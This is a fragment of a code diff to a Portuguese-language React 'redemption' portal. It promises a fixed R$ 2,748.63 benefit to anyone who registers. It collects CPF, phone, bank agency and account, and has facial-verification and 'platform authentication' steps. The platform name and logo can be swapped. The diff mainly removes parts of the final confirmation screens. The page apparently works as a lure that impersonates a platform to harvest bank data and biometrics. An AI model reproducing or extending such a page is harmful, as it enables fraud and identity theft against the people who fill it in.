-                      type="checkbox"
-                      checked={acceptedDepositTerms}
-                      onChange={(e) => {
-                        setAcceptedDepositTerms(e.target.checked);
-                        if (stepError) setStepError(null);
-                      }}
-                      className="mt-0.5 accent-[#151515] w-4 h-4 shrink-0"
-                    />
-                    <span>
-                      Confirmo que a conta corrente informada é de minha titularidade e autorizo o registro da solicitação de resgate de {formatBrl(displayAmountBrl)}.
-                    </span>
-                  </label>
-
-                  {stepError && (
-                    <div
-                      role="alert"
-                      className="mb-5 p-3 rounded-lg bg-red-50 border border-red-200 text-xs sm:text-sm text-red-800 flex items-center gap-2"
-                    >
-                      <AlertCircle className="w-4 h-4 shrink-0" aria-hidden="true" />
-                      <span>{stepError}</span>
-                    </div>
-                  )}
-
-                  <button
-                    type="submit"
-                    disabled={submittingRedeem}
-                    className="w-full h-14 px-6 bg-[#151515] hover:bg-neutral-800 disabled:bg-neutral-600 text-white text-base font-bold rounded-xl transition-colors inline-flex items-center justify-center gap-2.5 cursor-pointer"
-                  >
-                    <span>
-                      {submittingRedeem
-                        ? 'Registrando dados bancários...'
-                        : rp.confirmButtonText || 'CONFIRMAR RESGATE'}
-                    </span>
-                    {!submittingRedeem && <ArrowRight className="w-5 h-5" aria-hidden="true" />}
-                  </button>
-                </motion.form>
-              ) : step === 'verificacao_facial' ? (
-                <FacialVerificationStep
-                  consulta={consultaResult}
-                  platformName={rp.platformName}
-                  platformLogoUrl={platformLogoUrl}
-                  facialTitle={rp.facialTitle}
-                  facialInstructions={rp.facialInstructions}
-                  facialButtonText={rp.facialButtonText}
-                  onVerified={(updated) => {
-                    setConsultaResult(updated);
-                    transitionToStep('autenticacao');
-                  }}
-                />
-              ) : step === 'autenticacao' ? (
-                <PlatformAuthStep
-                  consulta={consultaResult}
-                  platformName={rp.platformName}
-                  platformLogoUrl={platformLogoUrl}
-                  authButtonText={rp.authButtonText}
-                  onCompleted={(updated) => {
-                    setConsultaResult(updated);
-                    transitionToStep('resgatado');
-                  }}
-                />
-              ) : (
-                /* ETAPA 5 — TELA FINAL DO RESGATE */
-                <motion.div
-                  key="yellow-redemption-done"
-                  initial={{ opacity: 0, y: 10 }}
-                  animate={{ opacity: 1, y: 0 }}
-                  transition={{ duration: 0.25 }}
-                  className="bg-white text-[#151515] border border-black/10 rounded-xl p-6 sm:p-8"
+                <div
+                  className={`mb-6 p-4 rounded-xl border text-xs sm:text-sm leading-relaxed ${
+                    consultaResult.guaranteed24h
+                      ? 'bg-emerald-50 border-emerald-200 text-emerald-900 font-semibold'
+                      : 'bg-neutral-50 border-neutral-200 text-neutral-700'
+                  }`}
                 >
-                  <div className="flex items-center gap-2.5 text-emerald-700 mb-2">
-                    <CheckCircle2 className="w-7 h-7 shrink-0" aria-hidden="true" />
-                    <h1 className="font-display text-xl sm:text-2xl font-bold text-[#151515]">
-                      {rp.finalTitle || 'SOLICITAÇÃO DE RESGATE RECEBIDA!'}
-                    </h1>
-                  </div>
-                  <p className="text-sm text-neutral-600 leading-relaxed mb-6">
-                    {rp.finalSubtitle ||
-                      'Seus dados foram enviados com sucesso. Acompanhe o processamento do seu resgate.'}
-                  </p>
+                  {consultaResult.guaranteed24h
+                    ? 'PREVISÃO DE DEPÓSITO: ATÉ 24 HORAS'
+                    : consultaResult.depositForecast ||
+                      'Pedido em análise cadastral e bancária. A previsão de depósito será confirmada após a aprovação da solicitação pelo setor responsável.'}
+                </div>
 
-                  <dl className="bg-neutral-50 border border-neutral-200 rounded-lg divide-y divide-neutral-200 text-sm mb-5">
-                    <div className="px-4 py-3 flex items-center justify-between gap-4">
-                      <dt className="text-neutral-500">Beneficiário</dt>
-                      <dd className="font-semibold text-[#151515] text-right">
-                        {consultaResult.profileLabel}
-                      </dd>
-                    </div>
-                    <div className="px-4 py-3 flex items-center justify-between gap-4">
-                      <dt className="text-neutral-500">Valor solicitado</dt>
-                      <dd className="font-display font-bold text-[#151515] tabular-nums">
-                        {formatBrl(displayAmountBrl)}
-                      </dd>
-                    </div>
-                    <div className="px-4 py-3 flex items-center justify-between gap-4">
-                      <dt className="text-neutral-500">Banco</dt>
-                      <dd className="font-medium text-[#151515] text-right">
-                        {consultaResult.bankLabel || rp.bankLabel}
-                      </dd>
-                    </div>
-                    <div className="px-4 py-3 flex items-center justify-between gap-4">
-                      <dt className="text-neutral-500">Agência / Conta corrente</dt>
-                      <dd className="font-mono font-medium text-[#151515] tabular-nums text-right">
-                        Ag. {consultaResult.agencyMasked || '-'} · CC {consultaResult.accountMasked || '-'}
-                      </dd>
-                    </div>
-                    <div className="px-4 py-3 flex items-center justify-between gap-4">
-                      <dt className="text-neutral-500">Número de protocolo</dt>
-                      <dd className="font-mono font-semibold text-[#151515] tabular-nums">
-                        {consultaResult.protocol}
-                      </dd>
-                    </div>
-                    <div className="px-4 py-3 flex items-center justify-between gap-4">
-                      <dt className="text-neutral-500">Situação da solicitação</dt>
-                      <dd className="font-semibold text-[#C8006B] text-right">
-                        {consultaResult.faceVerificationStatus === 'verificada'
-                          ? 'Identidade verificada · Em análise bancária'
-                          : 'Aguardando análise'}
-                      </dd>
-                    </div>
-                  </dl>
-
-                  <div
-                    className={`mb-6 p-4 rounded-xl border text-xs sm:text-sm leading-relaxed ${
-                      consultaResult.guaranteed24h
-                        ? 'bg-emerald-50 border-emerald-200 text-emerald-900 font-semibold'
-                        : 'bg-neutral-50 border-neutral-200 text-neutral-700'
-                    }`}
-                  >
-                    {consultaResult.guaranteed24h
-                      ? 'PREVISÃO DE DEPÓSITO: ATÉ 24 HORAS'
-                      : consultaResult.depositForecast || rp.finalInfoText}
-                  </div>
-
-                  <button
-                    type="button"
-                    onClick={handleReset}
-                    className="w-full h-12 px-5 bg-[#151515] hover:bg-neutral-800 text-white text-sm font-semibold rounded-xl transition-colors cursor-pointer"
-                  >
-                    Nova consulta
-                  </button>
-                </motion.div>
-              )}
+                <button
+                  type="button"
+                  onClick={handleReset}
+                  className="w-full h-12 px-5 bg-[#151515] hover:bg-neutral-800 text-white text-sm font-semibold rounded-xl transition-colors cursor-pointer"
+                >
+                  Nova consulta
+                </button>
+              </motion.div>
             </div>
           </section>
         )}
@@ -1283,7 +1051,7 @@ export function PublicPortal({
                 <div className="space-y-3 text-sm text-neutral-700 leading-relaxed">
                   <p>
                     <strong>1. Objeto do Programa:</strong> A campanha promocional promovida por{' '}
-                    <strong>{rp.companyName || settings.brandName}</strong> concede um benefício fixo único de{' '}
+                    <strong>{settings.brandName}</strong> concede um benefício fixo único de{' '}
                     <strong>45.811 pontos</strong>, equivalentes a <strong>R$ 2.748,63</strong>, aos participantes que realizarem o cadastro válido nesta página.
                   </p>
                   <p>
@@ -1297,7 +1065,7 @@ export function PublicPortal({
                 <div className="space-y-3 text-sm text-neutral-700 leading-relaxed">
                   <p>
                     <strong>1. Finalidade do Tratamento (LGPD):</strong> Os dados informados (nome completo, CPF, telefone com DDD, agência e conta corrente) são tratados exclusivamente para registro do participante na campanha de{' '}
-                    <strong>{rp.companyName || settings.brandName}</strong>, prevenção de concessões duplicadas e processamento da solicitação de resgate.
+                    <strong>{settings.brandName}</strong>, prevenção de concessões duplicadas e processamento da solicitação de resgate.
                   </p>
                   <p>
                     <strong>2. Minimização e Proteção:</strong> O CPF é protegido por função criptográfica no servidor para controle de unicidade, e apenas versões mascaradas de CPF, telefone, agência e conta corrente são mantidas para exibição e auditoria.
